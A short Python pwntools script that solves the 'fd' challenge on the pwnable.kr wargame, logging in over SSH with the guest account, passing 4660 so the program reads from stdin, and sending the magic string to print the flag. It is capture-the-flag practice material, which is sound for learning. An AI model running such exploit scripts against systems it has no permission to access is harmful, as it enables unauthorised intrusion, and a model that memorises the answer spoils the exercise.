#!/usr/bin/env python3

from pwn import *

s = ssh('fd', 'pwnable.kr', 2222, 'guest')
sh = s.run('sh')
# 0x1234 (4660) - 0x1234 = 0, file descriptor of stdin
sh.sendline(f'./fd {0x1234}')
# now just input 'LETMEWIN\n' in stdin to get the flag
sh.sendline('LETMEWIN')
sh.recvline()
print(f'FLAG:\n{sh.recvline().decode()}')
s.close()